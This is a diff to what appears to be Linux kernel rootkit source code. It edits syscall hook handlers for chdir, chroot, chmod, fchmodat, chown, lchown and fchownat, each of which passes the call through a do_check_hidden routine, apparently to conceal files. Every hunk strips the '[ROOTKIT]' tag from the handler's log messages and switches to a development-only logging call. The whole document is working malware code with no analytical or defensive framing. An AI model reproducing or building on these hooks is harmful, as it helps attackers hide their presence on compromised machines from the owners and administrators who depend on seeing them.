@@ -9,7 +9,7 @@
 // sys_chdir syscall hook handler
 SYSCALL_HOOK_HANDLER1(chdir, orig_chdir, p_regs, const char __user *, s_filename)
 {
-    pr_info("[ROOTKIT] chdir(%p)\n", s_filename);
+    pr_dev_info("chdir(%p)\n", s_filename);
 
     return do_check_hidden(orig_chdir, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -17,7 +17,7 @@ SYSCALL_HOOK_HANDLER1(chdir, orig_chdir, p_regs, const char __user *, s_filename
 // sys_chroot syscall hook handler
 SYSCALL_HOOK_HANDLER1(chroot, orig_chroot, p_regs, const char __user *, s_filename)
 {
-    pr_info("[ROOTKIT] chroot(%p)\n", s_filename);
+    pr_dev_info("chroot(%p)\n", s_filename);
 
     return do_check_hidden(orig_chroot, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -26,7 +26,7 @@ SYSCALL_HOOK_HANDLER1(chroot, orig_chroot, p_regs, const char __user *, s_filena
 SYSCALL_HOOK_HANDLER2(chmod, orig_chmod, p_regs, const char __user *, s_filename, umode_t,
                       ui16_mode)
 {
-    pr_info("[ROOTKIT] chmod(%p, %#ho)\n", s_filename, ui16_mode);
+    pr_dev_info("chmod(%p, %#ho)\n", s_filename, ui16_mode);
 
     return do_check_hidden(orig_chmod, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -35,7 +35,7 @@ SYSCALL_HOOK_HANDLER2(chmod, orig_chmod, p_regs, const char __user *, s_filename
 SYSCALL_HOOK_HANDLER3(fchmodat, orig_fchmodat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] fchmodat(%d, %p, %#ho)\n", i32_dfd, s_filename, ui16_mode);
+    pr_dev_info("fchmodat(%d, %p, %#ho)\n", i32_dfd, s_filename, ui16_mode);
 
     return do_check_hidden(orig_fchmodat, p_regs, i32_dfd, s_filename, 0);
 }
@@ -44,7 +44,7 @@ SYSCALL_HOOK_HANDLER3(fchmodat, orig_fchmodat, p_regs, int, i32_dfd, const char 
 SYSCALL_HOOK_HANDLER3(chown, orig_chown, p_regs, const char __user *, s_filename, uid_t, ui32_user,
                       gid_t, ui32_group)
 {
-    pr_info("[ROOTKIT] chown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);
+    pr_dev_info("chown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);
 
     return do_check_hidden(orig_chown, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -53,7 +53,7 @@ SYSCALL_HOOK_HANDLER3(chown, orig_chown, p_regs, const char __user *, s_filename
 SYSCALL_HOOK_HANDLER3(lchown, orig_lchown, p_regs, const char __user *, s_filename, uid_t,
                       ui32_user, gid_t, ui32_group)
 {
-    pr_info("[ROOTKIT] lchown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);
+    pr_dev_info("lchown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);
 
     return do_check_hidden(orig_lchown, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
 }
@@ -62,7 +62,7 @@ SYSCALL_HOOK_HANDLER3(lchown, orig_lchown, p_regs, const char __user *, s_filena
 SYSCALL_HOOK_HANDLER4(fchownat, orig_fchownat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, uid_t, ui32_user, gid_t, ui32_group)
 {
-    pr_info("[ROOTKIT] fchownat(%d, %p, %u, %u)\n", i32_dfd, s_filename, ui32_user, ui32_group);
+    pr_dev_info("fchownat(%d, %p, %u, %u)\n", i32_dfd, s_filename, ui32_user, ui32_group);
 
     return do_check_hidden(orig_fchownat, p_regs, i32_dfd, s_filename, 0);
 }
